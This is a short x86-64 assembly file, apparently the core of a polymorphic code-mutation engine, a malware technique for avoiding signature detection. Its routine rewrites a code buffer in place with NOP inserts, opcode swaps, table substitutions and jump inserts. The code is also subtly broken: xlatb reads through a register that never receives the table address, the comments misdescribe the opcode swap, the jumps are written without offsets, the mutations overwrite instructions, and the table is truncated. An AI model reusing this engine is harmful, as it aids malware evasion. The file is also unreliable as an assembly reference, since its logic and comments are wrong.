; PolymorphEngine.asm - Assembly Module

section .text
global apply_polymorphism

apply_polymorphism:
    push r12
    push r13
    push r14
    push r15
    
    mov r12, rdi        ; Code pointer
    mov r13, rsi        ; Size
    mov r14, rdx        ; Entropy seed
    
    lea r15, [rel substitution_table]

.loop:
    ; Get next mutation byte
    mov rax, r14
    rol rax, 5
    xor r14, rax
    
    ; Mutation type (0-7)
    mov rcx, r14
    and rcx, 7
    
    cmp rcx, 0
    je .nop_insert
    cmp rcx, 1
    je .reg_swap
    cmp rcx, 2
    je .instr_sub
    cmp rcx, 3
    je .jmp_insert
    jmp .next

.nop_insert:
    mov byte [r12], 0x90
    inc r12
    dec r13
    jmp .next

.reg_swap:
    mov al, [r12]
    cmp al, 0x89        ; MOV r/m32, r32
    jne .next
    mov byte [r12], 0x8B ; XCHG equivalent
    jmp .next

.instr_sub:
    mov al, [r12]
    xlatb                ; AL = [RBX + AL]
    mov [r12], al
    jmp .next

.jmp_insert:
    mov word [r12], 0xE9 ; JMP rel32
    add r12, 5
    sub r13, 5
    jmp .next

.next:
    inc r12
    dec r13
    jnz .loop
    
    pop r15
    pop r14
    pop r13
    pop r12
    ret

section .rodata
substitution_table:
    db 0x90, 0x90, 0x8B, 0x89, 0x01, 0x29, 0x31, 0x21
    db 0x48, 0x4C, 0x50, 0x58, 0x68, 0x5A, 0x6A, 0x00
    ; ... 256 entries
    